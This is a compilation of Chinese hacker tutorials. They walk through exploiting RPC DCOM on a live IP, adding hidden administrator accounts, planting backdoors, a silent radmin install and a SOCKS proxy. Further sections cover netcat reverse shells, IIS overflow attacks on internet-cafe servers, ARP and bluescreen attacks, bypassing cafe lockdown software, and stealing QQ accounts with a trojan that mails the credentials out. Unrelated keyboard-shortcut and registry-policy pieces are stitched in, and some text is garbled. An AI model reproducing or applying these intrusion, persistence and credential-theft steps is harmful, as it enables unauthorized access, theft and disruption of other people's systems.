溢出攻击工具:RpcDcom（通用溢出工具) 
脚本开启telnet工具：telnet.vbe opentelnet.exe resumetelnet.exe 
代理：sksockserver.exe 
后门程序：WinEggDropShellPro3thVersion

现在网上很流行dcomrpc，哈哈，那好就说说利用dcomrpc入侵。很入侵之后做的事情 

需要的工具： 
很好的： radmin.exe 
扫描工具: retinarpcdcom.exe 
溢出攻击工具:RpcDcom（通用溢出工具) 
脚本开启telnet工具：telnet.vbe opentelnet.exe resumetelnet.exe 
代理：sksockserver.exe 
后门程序：WinEggDropShellPro3thVersion 

好了，该做的都做的差不多了。现在开始把~~ 

首先使用retinarpcdcom.exe扫描一个网段。查找有rpc漏洞的机子，这个漏洞需要135端口开放，（想必 

随便扫一下就会发现有许多主机开放的135端口）。。。。。。 

(人走运座着都能检到钱) 211.217.50.xx 第一个主机就被扫出来又此漏洞。开始工作 

看看211.217.50.xx有没有其他的漏洞或是若口令之类的.我们可以使用流光扫描一下, 好了..看样子没有 
其他的缺陷,主机开了3389端口,我们可以上去看一下是xp版本还是win2k 

哈哈，是win2k server版本 


展开命令行： 

[查看dcomrpc的用法 用法 dcomrpc -d <host> [options] ] 

F:\hack>cd rpc\dcomrpc 

RPC DCOM Expl01t coded by .:[oc192.us]:. Security 

Complied and Modified by Expl01t www.longker.com 

Usage: 

dcomrpc -d <host> [options] 
Options: 
-d: Hostname to attack [Required] 
-t: Type [Default: 0] 
-r: Return address [Default: Selected from target] 
-p: Attack port [Default: 135] 
-l: Bindshell port [Default: 666] 

Types: 
0 [0x0018759f]: [Win2k-Universal] 
1 [0x0100139d]: [WinXP-Universal] 


开始进行溢出： 
F:\hack>cd rpc\dcomrpc -d 211.217.50.xx 0 

RPC DCOM remote expl01t - .:[oc192.us]:. Security 
Complied and recorrected by Expl01t www.longker.com 
[+] Resolving host.. 
[+] Done. 
[+] Expl01ting....Just wait...... 

等到出现，说明溢出成功 
c:\winnt\system32> 

接着我们建立用户 

c:\winnt\system32>net user blueye$ 1111 /add 
命令成功完成。 

把用户添加成超级管理员 
c:\winnt\system32>net localgroup administrators blueye$ /add 
命令成功完成。 


看看共享开了没有,没有的话把共享开开 

c:\winnt\system32>net share 
清单是空的。 

c:\winnt\system32>net share ipc$ 
命令成功完成。 
c:\winnt\system32>net share admin$ 
命令成功完成。 

到这里我们入侵告一段落 


[ 建 立 IPC$ 连 接 ，也可以使用tftp上传 ，先和对方建立连接] 

F:\hack>net use \\211.217.50.xx\ipc$ "1111" /user:blueye$ 

[ 上 传 一 个 后 门 程 序 到 对 方 的 主 机 里] 

F:\hack>copy d:\inject.exe \\211.217.50.xx\admin$\system32 

F:\hack>copy d:\tback.dll \\211.217.50.xx\admin$\system32 

然后运行后门程序，我们可以使用at命令。但是有的机器把at明令禁止了，建议直接开起telnet 
使用opentelnet.exe 关闭开启的telnet使用resumetelnet \\ip user password 
如果忘记开共享可以使用脚本开启telnet来开共享，用法: 
cscript telnet.vbe ip user password null port (null是验证方式) 

F:\hack>opentenet \\211.217.50.xx blueye$ 1111 1 4567 

F:\hack>telnet 211.217.50.xx 4567 
省略... 

连接并运行后门程序,运行后门程序命令 根目录：inject.exe -run 
（后门使用方法和安装都在zip文件里面包含了） 

后门端口123456 
F:\hack>nc 211.217.50.xx 123456 


Welcome To WinEggDropShell Matrix Version 

[Melody]# 


下面安装radmin 

配置好的radmin客户端有4个文件。配置radmin客户端可参考相关文章 
radmin.reg 
raddrv.dll 
admdll.dll 
r_server.exe 

把这个4个文件copy c:\winnt\system32 

在目录下面执行命令 
c:\winnt\system32>r_server /s radmin.reg -----导入注册表 

c:\winnt\system32>r_server /install /silence -----安装radmin.并且不显示托盘 

c:\winnt\system32>net start r_server ----- 启动服务 


可以开启3389的话你自己看着办把，哈哈 


安装sock代理 
把sksockserver.exe copy c:\winnt\system32 

c:\winnt\system32>sksockserver /install -----安装服务 

c:\winnt\system32>sksockserver -config port 1234 ----端口定在1234 自己可以改 

c:\winnt\system32>sksockserver -config starttype 2 ----开机自动启动 

c:\winnt\system32>net start skserver ----启动服务 


最后删除共享 
net share ipc$ /del 
net share admin$ /del 

 

在安装radmin的时候你发现有人已经安装了。。怎么办？走人？--------NO 


看操作 (我输入的内容) 

后门连接 

F:\hack>nc 211.217.50.xx 123456 


Welcome To WinEggDropShell Matrix Version 

[Melody]#（pslist） 

[Melody]#(pskill r_server) 

[Melody]#(shell) 

c:\winnt\system32>(del r_server.exe) 

c:\winnt\system32>(del admdll.dll) 

c:\winnt\system32>(del raddrv.dll) 


copy你自己的上去，然后安装 

省事的办法直接导入注册表，然后重新输入安装命令运行，就可以了，只是在原来默认端口上面架上了密 

码 


等等。。。。为什么我输入导入注册表命令不管用呢？出现什么regedit不是可运行的程序之类的 。 

完了，努力白费了。。。。。。。 -----------------------------NO 

出现这样的情况最简单的解决办法telnet上去导入试试看，什么？不是把，有没有搞错阿。。。 

呵呵，尽管放心，去试试看就知道；还可以先运行radmin 然后在radmin的dos下导入，也是可以的 

嗬嗬，去试试看吧 


防御办法： 
安装rpc补丁 
使用防火墙过滤135，445，139等端口

【珍藏的最全的windows操作系统快捷键】
珍藏的最全的windows操作系统快捷键 

一、常见用法： 
F1　　　　　　　　　　　显示当前程序或者windows的帮助内容。 
F2　　　　　　　　　　　当你选中一个文件的话，这意味着“重命名” 
F3　　　　　　　　　　　当你在桌面上的时候是打开“查找：所有文件” 对话框 
F10或ALT　　　　　　　　激活当前程序的菜单栏 
windows键或CTRL+ESC　　 打开开始菜单 
CTRL+ALT+DELETE　　　　 在win9x中打开关闭程序对话框 
DELETE　　　　　　　　　删除被选择的选择项目，如果是文件，将被放入回收站 
SHIFT+DELETE　　　　　　删除被选择的选择项目，如果是文件，将被直接删除而不是放入回收站 
CTRL+N　　　　　　　　　新建一个新的文件 
CTRL+O　　　　　　　　　打开“打开文件”对话框 
CTRL+P　　　　　　　　　打开“打印”对话框 
CTRL+S　　　　　　　　　保存当前操作的文件 
CTRL+X　　　　　　　　　剪切被选择的项目到剪贴板 
CTRL+INSERT 或 CTRL+C　 复制被选择的项目到剪贴板 
SHIFT+INSERT 或 CTRL+V　粘贴剪贴板中哪谌莸降鼻拔恢?
ALT+BACKSPACE 或 CTRL+Z 撤销上一步的操作 
ALT+SHIFT+BACKSPACE　　 重做上一步被撤销的操作 
　 
Windows键+M　　　　　　 最小化所有被打开的窗口。 
Windows键+CTRL+M　　　　重新将恢复上一项操作前窗口的大小和位置 
Windows键+E　　　　　　 打开资源管理器 
Windows键+F　　　　　　 打开“查找：所有文件”对话框 
Windows键+R　　　　　　 打开“运行”对话框 
Windows键+BREAK　　　　 打开“系统属性”对话框 
Windows键+CTRL+F　　　　打开“查找：计算机”对话框 
SHIFT+F10或鼠标右击　　 打开当前活动项目的快捷菜单 
SHIFT　　　　　　　　　 在放入CD的时候按下不放，可以跳过自动播放CD。在打开word的时候按下不放，可以跳过自启动的宏 
　 
ALT+F4　　　　　　　　　关闭当前应用程序 
ALT+SPACEBAR　　　　　　打开程序最左上角的菜单 
ALT+TAB　　　　　　　　 切换当前程序 
ALT+ESC　　　　　　　　 切换当前程序 
ALT+ENTER　　　　　　　 将windows下运行的MSDOS窗口在窗口和全屏幕状态间切换 
PRINT SCREEN　　　　　　将当前屏幕以图象方式拷贝到剪贴板 
ALT+PRINT SCREEN　　　　将当前活动程序窗口以图象方式拷贝到剪贴板 
CTRL+F4　　　　　　　　 关闭当前应用程序中的当前文本（如word中） 
CTRL+F6　　　　　　　　 切换到当前应用程序中的下一个文本（加shift 可以跳到前一个窗口） 

在IE中： 

ALT+RIGHT ARROW　　　　 显示前一页（前进键） 
ALT+LEFT ARROW　　　　　显示后一页（后退键） 
CTRL+TAB　　　　　　　　在页面上的各框架中切换（加shift反向） 
F5　　　　　　　　　　　刷新 
CTRL+F5　　　　　　　　 强行刷新 

　 
　　目的快捷键 

　　激活程序中的菜单栏 F10 

　　执行菜单上相应的命令 ALT+菜单上带下划线的字母 

　　关闭多文档界面程序中的当 

　　前窗口 CTRL+ F4 

　　关闭当前窗口或退出程序 ALT+ F4 

　　复制 CTRL+ C 

　　剪切 CTRL+ X 

　　删除 DELETE 

　　显示所选对话框项目的帮助 F1 

　　显示当前窗口的系统菜单 ALT+空格键 

　　显示所选项目的快捷菜单 SHIFT+ F10 

　　显示“开始”菜单 CTRL+ ESC 

　　显示多文档界面程序的系统 

　　菜单 ALT+连字号(-) 

　　粘贴 CTR L+ V 

　　切换到上次使用的窗口或者 

　　按住 ALT然后重复按TAB， 

　　切换到另一个窗口 ALT+ TAB 

　　撤消 CTRL+ Z 

二、使用“Windows资源管理器”的快捷键 

　　目的快捷键 

　　如果当前选择展开了,要折 

　　叠或者选择父文件夹左箭头 

　　折叠所选的文件夹 NUM LOCK+负号(-) 

　　如果当前选择折叠了，要展开 

　　或者选择第一个子文件夹右箭头 

　　展开当前选择下的所有文件夹 NUM LOCK+* 

　　展开所选的文件夹 NUM LOCK+加号(+) 

　　在左右窗格间切换 F6 

三、使用 WINDOWS键 

　　可以使用 Microsoft自然键盘或含有 Windows徽标键的其他任何兼容键盘的以下快捷键。 

　　目的快捷键 

　　在任务栏上的按钮间循环 WINDOWS+ TAB 

　　显示“查找：所有文件” WINDOWS+ F 

　　显示“查找：计算机” CTRL+ WINDOWS+ F 

　　显示“帮助” WINDOWS+ F1 

　　显示“运行”命令 WINDOWS+ R 

　　显示“开始”菜单 WINDOWS 

　　显示“系统属性”对话框 WINDOWS+ BREAK 

　　显示“Windows资源管理器” WINDOWS+ E 

　　最小化或还原所有窗口 WINDOWS+ D 

　　撤消最小化所有窗口 SHIFT+ WINDOWS+ M 

四、使用“我的电脑”和“Windows资源管理器”的快捷键 

　　目的快捷键 

　　关闭所选文件夹及其所有父 

　　文件夹按住 SHIFT键再单击“关闭按钮（仅适用于“我的电脑”） 

　　向后移动到上一个视图 ALT+左箭头 

　　向前移动到上一个视图 ALT+右箭头 

　　查看上一级文件夹 BACKSPACE 

五、使用对话框中的快捷键 

　　目的快捷键 

　　取消当前任务 ESC 

　　如果当前控件是个按钮，要 

　　单击该按钮或者如果当前控 

　　件是个复选框，要选择或清 

　　除该复选框或者如果当前控 

　　件是个选项按钮，要单击该 

　　选项空格键 

　　单击相应的命令 ALT+带下划线的字母 

　　单击所选按钮 ENTER 

　　在选项上向后移动 SHIFT+ TAB 

　　在选项卡上向后移动 CTRL+ SHIFT+ TAB 

　　在选项上向前移动 TAB 

　　在选项卡上向前移动 CTRL+ TAB 

　　如果在“另存为”或“打开” 

　　对话框中选择了某文件夹， 

　　要打开上一级文件夹 BACKSPACE 

　　在“另存为”或“打开”对 

　　话框中打开“保存到”或 

　　“查阅” F4 

　　刷新“另存为”或“打开” 

　　对话框 F5 

六、使用“桌面”、“我的电脑”和“Windows资源管理器”快捷键 

　　选择项目时，可以使用以下快捷键。 

　　目的快捷键 

　　插入光盘时不用“自动播放” 

　　功能按住 SHIFT插入 CD-ROM 

　　复制文件按住 CTRL拖动文件 

　　创建快捷方式按住 CTRL+SHIFT拖动文件 

　　立即删除某项目而不将其放入 SHIFT+DELETE 

　　“回收站” 

　　显示“查找：所有文件” F3 

　　显示项目的快捷菜单 APPLICATION键 

　　刷新窗口的内容 F5 

　　重命名项目 F2 

　　选择所有项目 CTRL+ A 

　　查看项目的属性 ALT+ ENTER或 ALT+双击 

　　可将 APPLICATION键用于 Microsoft自然键盘或含有 APPLICATION键的其他兼容键 

七、Microsoft放大程序的快捷键 

　　这里运用Windows徽标键和其他键的组合。 

　　快捷键目的 

　　Windows徽标+PRINT SCREEN将屏幕复制到剪贴板（包括鼠标光标） 

　　Windows徽标+SCROLL LOCK将屏幕复制到剪贴板（不包括鼠标光标） 

　　Windows徽标+ PAGE UP切换反色。 

　　Windows徽标+ PAGE DOWN切换跟随鼠标光标 

　　Windows徽标+向上箭头增加放大率 

　　Windows徽标+向下箭头减小放大率 

　 
八、使用辅助选项快捷键 

　　目的快捷键 

　　切换筛选键开关右SHIFT八秒 

　　切换高对比度开关左ALT+左SHIFT+PRINT SCREEN 

　　切换鼠标键开关左ALT+左SHIFT+NUM LOCK 

　　切换粘滞键开关 SHIFT键五次 

　　切换切换键开关 NUM LOCK五秒 


【破解网吧权限】
下面的是超级连接,这里显示不出来,地址为: 
http://www.kkkip.com/bbs/dispbbs.asp?boardID=1&RootID=2870&ID=2870 
在线查出万象幻境各项密码 
在线破解美屏系统设置密码 
解除对文件下载的限制 
解除对注册表编辑器的锁定 
破解网吧幽灵 
在线清除还原精灵 
在线下载系统（网际快车） 
在线控制硬盘资源 
解除internet选项里的权限限制 
恢复各网站注册表的改动 
############################################ 
网吧权力限制我将之分成三级： 
初级 
　1．禁止“运行”; 
　2．禁止使用菜单条上的右键； 
　3．屏蔽本地硬盘（通过修改注册表）; 
　4．屏蔽IE中的文件菜单; 
　5．禁止IE下载; 
　6．不提供TE(只提供去掉TE的QQ); 
　　中级 
　中级除初级所有的限制外还有: 
　1。禁止使用WINZIP; 
　2。禁止使用实核DOS; 
　3。禁止导入REG文件; 
　4。禁止导入INF文件; 
　5。禁止使用组合键(主要是WIN开始+?,SHIFT+?,ALT+?); 
　　高级 
　　高级中除了初,中级所有的限制外还有 
　1。开机屏蔽F4,F5和F8键; 
　2。屏蔽MS-DOS方式; 
　3。屏蔽鼠标右键; 
　4。禁止是使用REGEDIT; 
　　(这高级类我个人认为纯属变态行为，因为机子一旦出了什么问题，那就%#%@!#@*&……，不过好在只要能进入WINDOWS的话，咱就有办法绕过去^_^) 
　　当然一定还有的就是――美萍。 
　　好了，我就挨个挨个的说其对策吧。 
　　对于初级 
　　用“WIN开始”＋D，刷新桌面。在美萍下的桌面实际是美萍指定的一个目录，而原桌面则被隐藏了，刷新是对原桌面的刷新，只要你不切换其他窗口，我的电脑等将会一直存在于桌面之上。你要做的是：打开我的电脑，然后再点向上，就可以把桌面以窗口的形式打开了（因为硬盘是被屏蔽掉的，当我们打开我的电脑时将什么都看不见），此时你要做的是新建一个文本文档输入这么几行: 

REGEDIT4 

[HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionExplorer] 
"NoDrives"=dword:00000000 

另存为随便一个REG文件就可以了，之后你要做的就是导入它(理解为运行它也行),等你再次开机时打开我的电脑就会看见那可爱的C:盘呀D:盘呀就又回来啦.当然你如果不想看见美萍,也行,只要把文档的内容改改就行了: 

REGEDIT4 

[HKEY_LOCAL_MACHINESoftwareMpsoftSmenu] 
"exitpassword"="i" 
"setuppassword"="i" 
"quitpassword"="i" 

继续导入它,重启后你就放心大胆的退出美萍吧,此时它的密码可是什么都没有哟＾_＾但愿你不要干坏事。 
　　此外我们还可以通过“查找”来绕过美萍(自然是用“WIN”+F啦)。网吧老板们大都因为屏蔽了硬盘而对次热键大开绿灯。为什么会这样呢?其实原因也是再简单不过的了,因为你在搜索栏内找不到本地硬盘,如果你选择我的电脑来进行查找如COMMAND等的文件时一定会被告知“找不到”。但我要说的是他们的如意算盘又打错了，搜索栏中是可以输入的。在上面如输入“C:”然后再找“COMMAND”，哈，找到的可就是一大堆的东东了。此时如运行COMMAND.COM是可是进入DOS,打开WINDOWSCOMMAND就是用窗口形式打开此目录的。这样一来，咱又可以对本地硬盘进行访问啦。 
　　对于中级 
　　因为禁止导入REG文件，所以我们无法通过导入注册表的方法来实现访问，又由于禁止使用WINZIP，所以此方法也失灵，禁用“查找”，所以……。但你不要认为我们就真的没办法绕过去了，方法多多，看你能否想的到咯。 
　　嘿嘿……我们要用的还是IE。在IE地址栏中用中文输入“桌面”回车。如此一来我们熟悉的桌面又以窗口的形式打开啦~现在我们要做的和上面要做的一样：新建一个文本文档，然后输入这么一行 

C:COMMAND.COM 
当然此时我们就的把他另存为批处理文件啦。随便的一个文件名后加上.BAT就可以了，然后运行它。哈，我们又跳入了DOS了(注意的是此时是没办法用REGEDIT来修改注册表的,如果美萍是6.5版以上的注册表修改器将会是一闪而过。我们是无法使用的。）跳入DOS后一般是没有限制的。然后……嘿嘿……不说什么了吧:> 
　　对于高级 
　　咱是没话说了。开机屏蔽F4，F5，F8我们不能从开机时下手；屏蔽MS-DOS，咱不能使用批处理文件和进入MS-DOS方式(也不能玩DOS游戏,相信此网吧里是不会提供游戏的,那儿也只可能有IE和去掉TE的QQ)；屏蔽鼠标右键菜单，我们不能新建文件；估计此时网吧里应该用的是超级兔子中的安全限制全选+屏蔽本地硬盘+美萍来限制大家的。估计你看到这时想必要嚎啕大哭一场，别，请珍惜这世界上的每一滴水，放心什么都挡不住咱：） 
　　不过呢，到此我们再也找不到老板们的防御漏洞了。没办法，只好用美萍和IE的了。 
　　和中级说的一样，在IE的地址栏中输入如我的文档或桌面等，我的文档和桌面将会以窗口的形式打开。别忘了此时你只有一个左键，打消你通过建立文件来绕过美萍的念头吧。此时你要做的工作只有一个：查找。找什么呢？找一个快捷方式的文件，找到后点上它。不知你注意过IE没？工具栏上是有一个属性按钮的。点属性。我们将看见有目标和其始位置的，注意一下其始位置吧，它是本地硬盘上的一个目录的，好~接下来点查找目标，咦~是不是又到了本地硬盘上了？不过这个目录是不是很眼熟？对了~就是刚才那个目标目录。好了现在我们已经完成了对本地硬盘进行访问的目的了。什么？你的QQ的聊天记录不能DEL掉？唉~别按DEL键呀，它可是有可能被屏蔽掉了哟。点IE上的删除吧(就是那个叉叉)。怎么？认为权限太少？，那你别忙呀，解铃还需系铃人。找兔子吧，一般的说它在硬盘上的某处。根据大家的习惯来看，它不是在C盘的TOOLS下就是在D盘上的TOOLS下。其实你也别想着更多的权限了。大家想做的不就是想把自己的上网记录删除么？阿云我告诉你他们的地址不就完了？不用那么麻烦的。 
　CROGRAM FILSQICQ你的号码(也可能是是cROGRAM FILESTENCENT你的号码) 这是QQ的聊天记录; 
　C:WINDOWSCOOKIES 这是你网上个帐号的密码保存处; 
嘿,删了不就完了? 
　　写到这儿,我也没什么好说的了,最后自然的给大家介绍介绍经验了. 
　1。确认本地禁止导入REG文件的方法:看看REG文件是不是只能以文本文件打开，如是的话则被屏蔽。 
　2。确认禁用组合键，用QQ。哈，又是QQ。把QQ的热键设为ALT+Z，按下ALT+Z看看QQ能否弹出，如不能，则被屏蔽 
　3。确认屏蔽鼠标右键菜单。这个就比较简单了，屏蔽了就是无论在桌面或目录的下点右键都不会有菜单的弹出。 
哦~对了，我还的补充几点，先别嫌我烦，等我把话说完。 
　1。我们还可以通过网络邻居的。把目录设为完全共享，通过网络邻居访问本机，之后……。当你以网络邻居的身份访问本机时，哈，一切烦人的权限限制就都没啦。什么？你不知道这么设？哈，是属性里的哟，自己看吧。 
　2。桌面其实是本地硬盘上的一块区域(是C:WINDOWSDESKTOP目录)。 
　3。网吧里的QQ一定有一个备份在本地硬盘上的而且一般会在D盘如TOOLS，DOWNLOADS或BACKUP之类的目录下的，自己用心找找，找到后重新安装，把原来的QQ覆盖掉后，嘿~久别的TE又回来啦。 
　4。如进入DOS模式，权大家还是多用内部命令，少用外部命令。因为外部命令是可改名的，况且杀伤太大，一不小心…… 
　5。网吧里最好不要用木马，一来是阿云我不赞成，二来是很容易被对方发现，如果你因次多了两只熊猫眼嘛~可别怪我没提醒你哟~ 
　6。如果你找不到那些快捷方式，哈去点IE的最左上角，可以拉一个快捷方式的，改改其始位置后就可以了~ 




【破解网页文字无法复制的方法】
破解网页文字无法复制的方法[转载] 
浏览网页的时候，你可能遇到过有些网页，无论你按住鼠标左键如何不停的拖动，都无法选中需要的文字。那是因为网站为了保密，对网页文件进行了加密，使用户无法通过选取的方法复制网页中的文字，采用“另存为”保存在硬盘中也无法复制其中的文字，是不是让你很恼火。下面我介绍几种方法来破解它：

1．先按CTRL+A键将网页全部选中，“复制”，然后从中选取需要的文字即可。

2．调用源文件查看文字。选择菜单“查看”，点击“源文件”，打开记事本就能看到网页的全部文字，选取你需要的即可。

3．点击IE的“工具/Internet”菜单，进入“安全”标签页，选择“自定义级别”，将所有脚本全部禁用然后按F5键刷新网页，然后你就会发现那些无法选取的文字就可以选取了。

4．利用抓图软件SnagIt实现。SnagIt中有一个“文字捕获”功能，可以抓取屏幕中的文字，也可以用于抓取加密的网页文字。单击窗口中的“文字捕获”按钮，单击“输入”菜单，选择“区域”选项，最后单击“捕获”按钮，这时光标会变成带十字的手形图标，按下鼠标左键在网页中拖动选出你要复制的文本，松开鼠标后会弹出一个文本预览窗口，可以看到网页中的文字已经被复制到窗口中了。剩下的工作就好办了，把预览窗口中的文字复制到其他文本编辑器中即可，当然也可以直接在这个预览窗口中编辑修改后直接保存。

5．使用特殊的浏览器。如TouchNet Browser浏览器具有编辑网页功能，可以用它来复制所需文字。在“编辑”菜单中选择“编辑模式”，即可对网页文字进行选取。

以上方法对某些网页并不都适用，你可视情选用。



【禁止使用注册表编辑器】
禁止使用注册表编辑器


修改注册表是复杂和危险的，所以不希望用户去修改注册表。通过修改注册表，可以禁止用户运行系统提供的两个注册表编辑器。新建一个双字节(REG＿DWORD)值项HKEY＿CURRENT＿USER＼Software＼Microsoft＼ Windows＼CurrentVersion＼Policies＼System＼DisableRegistryTools，修改其值为1。这样，用户就不能启动注册表编辑器了。
注意：使用此功能要小心，最好作个注册表备份，或者准备一个其他的注册表修改工具。因为当你禁止使用注册表编辑器后，就不能再使用该注册表编辑器将值项改回了。



【禁止查看指定磁盘驱动器的内容 】
禁止查看指定磁盘驱动器的内容 


如果某个磁盘驱动器中存放了重要的数据，不希望用户查看该驱动器的内容，可以使用此方法来禁止察看该驱动器的内容。新建一个双字节(REG＿DWORD)值项HKEY＿CURRENT＿USER＼Software＼Microsoft＼ Windows＼Current Version＼Policies＼Explorer＼NoViewOnDrive。该值项从最低位(第0位)到第25位，共26个字位，分别代表驱动器A到驱动器Z。例如我们想禁止用户使用软盘驱动器A和B，以及驱动器D，可以修改“NoViewOnDrive”的值为“0000000b”(第0、1、3位的值为1)。
修改后需要重启桌面使更改生效。这时再进入到“我的电脑”，双击驱动器D，系统会弹出一个消息框，告诉用户不能进行此*作。但是应用程序仍然可以访问被禁止的驱动器。被禁止的驱动器图标并没有被删除，仍然出现在“我的电脑”和“资源管理器”中。



【禁止用户使用“任务管理器”】
禁止用户使用“任务管理器”

用户可以使用“任务管理器”对话框来启动和结束本地进程，查看和管理其他计算机上的进程，改变进程的优先级。通过修改注册表，可以禁止用户使用“任务管理器”。新建一个双字节(REG＿DWORD)值项HKEY＿CURRENT＿USER＼Software＼Microsoft＼ Windows＼CurrentVersion＼Policies＼System＼DisableTaskMgr，修改其值为1。



【禁止运行命令解释器和批处理文件】
禁止运行命令解释器和批处理文件


通过修改注册表，可以禁止用户使用命令解释器(CMD.exe)和运行批处理文件(.bat文件)。新建一个双字节(REG＿DWORD)执行HKEY＿CURRENT＿USER＼Software＼Policies＼ Microsoft＼Windows＼System＼DisableCMD，修改其值为2，命令解释器和批处理文件都不能被运行。修改其值为1，则只是禁止命令解释器的运行。



【端口入侵】
1. 1433端口入侵
scanport.exe 查有1433的机器
SQLScanPass.exe 进行字典暴破（字典是关键）
最后 SQLTools.exe入侵
=============================
对sql的sp2及以下的系统，可用sql的hello 溢出漏洞入侵。
nc -vv -l -p 本机端口 sqlhelloF.exe 入侵ip 1433 本机ip 本机端口
（以上反向的，测试成功）
sqlhelloz.exe 入侵ip 1433 （这个是正向连接）

2. 4899端口入侵
用4899过滤器.exe，扫描空口令的机器

3. 3899的入侵
对很早的机器，可以试试3389的溢出(win3389ex.exe)
对2000的机器，可以试试字典暴破。(tscrack.exe)

4. 80入侵
对sp3以前的机器，可以用webdav入侵；
对bbs论坛，可以试试上传漏洞（upfile.exe或dvup_delphi.exe）
可以利用SQL进行注入。（小榕的注入软件）。

5. serv-u入侵(21端口）
对5. 004及以下系统，可用溢出入侵。（serv5004.exe）
对5.1.0.0及以下系统，可用本地提升权限。（servlocal.exe）
======================================
对serv-u的MD5加密密码，可以用字典暴破。（crack.vbs）
输入一个被serv-u加密的密码（34位长），通过与字典档（dict.txt）的比较，得到密码。如：cscript crack.vbs ib0AD10648F17E9E8D1FF316C1BA75105A

6. 554端口
用real554.exe入侵。

7. 6129端口
用DameWare6129.exe入侵。

8. 系统漏洞
利用135、445端口，用ms03026、ms03039、ms03049、ms04011漏洞，
进行溢出入侵。

9. 3127等端口
可以利用doom病毒开的端口，用nodoom.exe入侵。（可用mydoomscan.exe查）。

10. 其他入侵
利用shanlu的入侵软件入侵（WINNTAutoAttack.exe）。
 
  入侵网吧主机 
  当然，首先确定主机的ip地址。运行c:\command.com（怎么运行？后面介绍），输入ipconfig得到自己的ip,比如168.192.1.14，则主机ip应为192.168.1.1，下载SuperScan30-CN.zip，扫描ip添上它，呵呵！看看它到底开了什么端口,如果开了80端口，那么恭喜你了，为了进一步确认，http://192.168.1.1,是不是出现“ 

正在建立 
您想要连接的站点目前没有默认页。可能正在被进行升级。 


-------------------------------------------------------------------------------- 

请稍候再试此站点。假如问题仍然存在，请与 Web 站点管理员联系。   

”，如果真是，那么就可以进一步攻击了.我们菜鸟就用idq益出吧！ 
下好,nc.exe, 
IISIDQ.zip 
运行IISMiscOverflowV2_Build0013.exe,被攻击地址：网吧主机ip,port:80,单选框勾上“益出后在一个端口监听”，监听端口：813,操作系统类型选择 
iis中文sp2 
iis中文sp1 
iis中文sp0 
中的一个，一般是sp2成功的概率高点，不过没成功你可以多试记个。 
再在本地command.com输入 
nc -vv 192.168.1.1 813 
  哈哈，我们登陆了！ 
net user test test123 /add /*创建一用户名test密码test123的用户 
net localgroup administrators test /add  /*把test加入到administrators组*/ 
由于nt和98不能ipc$，所以应该打开它的3389，这里你可以参考wawa的《菜鸟打开3389端口》的文章，^再从http://www.sandflee.net/wawa提供的web登陆3389进行连接（终端服务客户端)，对你网吧的主机进行控制！ 
  不过，我相信没几个网管还会犯这种低级错误，更多的我们会遇到只开了135,139或者干脆只有135的情况，这时就更考验你的耐心和细致的思维了。你需要收集更多的资料，推荐小榕的流光和WMICracker.exe,用法自己去netxeyes.com找，我就不多说了:PPP（最好把破获的‘万象’密码，还原精灵密码等等加入到你的密码文档里） 

2，入侵网吧分机 
  大量的网吧把游戏盘，更有甚者把系统盘（c:)共享出来，以为设置了密码就无事了。其实利用98的共享漏洞很快就可以得到共享密码，需要的利用工具是http://www.heibai.net/download/show.php?id=1465&down=1 ,这样就可以进入别的机器的硬盘。这个时候在c:\command.com内输入c:\con\con或者c:\null\null就可以叫它蓝屏死机，不过如果你的机器没有打补丁的话照样死掉（这叫做损人不利己呀：PP). 

3，如何在网吧里搞破坏 
  1）arp攻击,推荐xfocus的“局域网终结者”，可以指定ip地址进行攻击，使被攻击者完全从网上掉下来，还有一种可能不断弹出网卡地址冲突的警告对话框，当然要是对方在打cs或者网络游戏的话那就惨了:( 
  2）蓝屏炸弹攻击。孤独剑客的iphaker可以很好地完成任务（前提当然是对方有这个漏洞） 
  3）嗅探攻击，这个不说什么，因为我也不懂，只知道小榕为此写了个arpsniffer，大家当下来就知道怎么用了，不过不要被网管逮个正着啊！ 

4，网吧管理软件破解 
  其实这个应该放到所有之前。这里主要针对万象，其它的基本上都一样。 
  1）进入硬盘：方法真是多如牛毛，我认为最简单而又有效的是利用QQ上的TBrowser.exe， 
直接在地址栏输入c:\,d:\……即可.当然你也可以利用些机器上现存的软件（比如QQ的发送文件，frontpage,winzip,winrar等） 
  2）解除下载限制：在硬盘上建立如下内容的文件（没有notepad.exe怎么办？难道硬盘上连.txt文件都没有？打开一个，文件-->新建，不就ok了？） 
REGEDIT4 

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3] 

"1803"=dword:00000000 

请注意REGEDIT4“4”前面没有空格，以下空一行，项名称后面空一行！ 
  存为任意的reg文件即可，运行，把这个注册表文件导入系统注册表，再试试看？可以下载了吧！ 
  3）获得万象管理软件的管理密码，下载wx1.0.zip，解压缩，运行即可得到！简单吧！~~得到了密码，一切都显得那么简单，“开始”--退出即可。。 

5，得到还原精灵密码 
  参考文章:http://www.ttian.net/article/show.php?id=176  思路很棒！ 

  搞掂了还原精灵，才可以进行下面的工作，不然被还原精灵一还原，就没什么搞头的了。 

6，如何盗取QQ号码 
  这里推荐广外女生的“广外幽灵”，她不是简单的键盘记录类的工具。首先，你必须需要找到一个不需要smtp身份验证的邮箱，不要告诉我你用163.com,sohu.com的，因为这种门户网站出于安全性的考虑，都增加了smtp验证机制，象21cn.com 
现在也有了。最好到什么信息港，学校的邮件服务器去申请。如何知道自己的邮箱是否带有smtp验证呢？ 
  要明白的几点： 
  smtp默认端口25 
  smtp是一个发送信笺的协议 
  学会从邮箱提供商那里得到自己的smtp服务器（这里假设为smtp.server.com) 
  ok,开始吧！ 
nc -vv smtp.server.com 25 /*登陆服务器*/ 
HELLO 
MAIL FROM:cocoruder@163.com  /*标明发送人地址*/ 
RCPT TO：mymail@server.com  /*标明收件人地址*/ 
DATA 
qhghsdjh               /*随便输拉*/ 
.这里回车换行 
QUIT 

这里采用匿名的方式通过smtp服务器发送邮件，如果成功，表示不需要验证，否则，必有错误提示。 
   ok,赶快去申请个没有smtp验证的邮箱吧！ 
  添好广外幽灵，生成服务端，在机器上运行下就可以，以后就等着去你的邮箱拿QQ吧！ 
  不过一般的网吧里都会有金山毒霸之类的杀毒软件，你当然可以把它们卸载掉。 

7，还有什么？盗取网络游戏号？ddos攻击？晕！我可没力气打字了，下次再讲，88^^^^^  
Border Manager 3.6 SP 1a. 
-Netware 6.0 SP 1 verified.
详细描述
第一个漏洞存在于FTP-proxy server of BM 3.6中，在发送连接请求到代理服务器后，攻击者可以发送几MEG的随机数据，可导致服务器停止响应TCP/IP通信。

第二个漏洞在IP/IPX网关的8225端口上，如果发送2M字节随机数据到此端口，可导致ipipxgw.nlm崩溃。
